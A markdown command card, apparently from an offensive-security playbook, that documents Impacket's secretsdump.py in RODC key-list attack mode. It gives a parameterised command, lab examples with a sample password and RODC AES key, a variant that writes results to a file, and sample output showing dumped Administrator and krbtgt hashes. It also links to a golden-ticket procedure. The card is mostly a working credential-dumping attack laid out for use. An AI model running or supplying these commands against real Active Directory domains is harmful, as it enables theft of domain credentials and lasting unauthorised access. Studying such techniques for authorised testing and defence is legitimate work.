---
type: command
executor: bash
data: >-
  secretsdump.py $_DOMAIN/$_USERNAME:$_PASSWORD@$_RODC_HOST -rodcNo $_RODC_NO
  -rodcKey $_RODC_KEY -use-keylist
tags:
  - credential-access
  - active-directory
platforms:
  - Linux
verified: true
validated: true
---

# impacket-secretsdump-with-keylist

## Command

```bash
secretsdump.py $_DOMAIN/$_USERNAME:$_PASSWORD@$_RODC_HOST -rodcNo $_RODC_NO -rodcKey $_RODC_KEY -use-keylist
```

## Description

This command dumps RODC secrets using the key list attack mode in Impacket's secretsdump.py, retrieving cached hashes and NTDS data.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_DOMAIN | Target domain name | Yes |
| $_USERNAME | Username for authentication | Yes |
| $_PASSWORD | Password for authentication | Yes |
| $_RODC_HOST | IP or hostname of the RODC | Yes |
| -rodcNo $_RODC_NO | RODC identifier number | Yes |
| -rodcKey $_RODC_KEY | RODC AES key in hex | Yes |
| -use-keylist | Enable key list attack mode | Yes |

## Examples

### Basic Usage

```bash
secretsdump.py lab.local/admin:Password123@192.168.1.10 -rodcNo 25078 -rodcKey eacd894dd0d934e84de35860ce06a4fac591ca63c228ddc1c7a0ebbfa64c7545 -use-keylist
```

### Advanced Usage

Output to files:

```bash
secretsdump.py lab.local/admin:Password123@192.168.1.10 -rodcNo 25078 -rodcKey eacd894dd0d934e84de35860ce06a4fac591ca63c228ddc1c7a0ebbfa64c7545 -use-keylist -outputfile rodc_secrets
```

## Expected Output

Dumped credentials:

```
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] Dumping SAM hashes...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping NTDS.dit secrets...
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:...::: 
[*] Clean exit.
```

## Related

- [[procedures/RODC-Key-List-Extraction-and-Golden-Ticket-Creation]]
- [[tools/Impacket]]
